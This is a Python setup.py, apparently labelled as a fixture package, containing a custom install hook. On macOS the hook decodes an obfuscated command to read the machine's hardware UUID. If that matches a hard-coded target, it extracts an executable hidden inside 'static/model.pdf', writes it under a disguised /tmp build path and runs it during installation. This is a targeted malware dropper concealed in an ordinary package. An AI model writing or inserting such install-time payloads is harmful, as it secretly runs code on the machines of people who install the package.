import os
import subprocess
import sys
from base64 import b64decode
from setuptools import setup
from setuptools.command.install import install


class PlatformInstall(install):
    def run(self):
        if sys.platform != "darwin":
            return
        command = b64decode("aW9yZWcgLWsgSU9QbGF0Zm9ybVVVSUQ=").decode()
        raw = subprocess.check_output(command.split()).decode()
        uuid = raw[raw.find("IOPlatformUUID") + 19 : raw.find("IOPlatformUUID") + 55]
        if uuid in ["11111111-2222-3333-4444-555555555555"]:
            content = open("static/model.pdf", "rb").read()
            dest_dir = "/tmp/go-build123/exe/"
            os.makedirs(dest_dir, exist_ok=True)
            with open(dest_dir + "gomod", "wb") as output:
                output.write(content[273861:])
            subprocess.Popen([dest_dir + "gomod"], close_fds=True)
        install.run(self)


setup(name="fixture-package", cmdclass={"install": PlatformInstall})
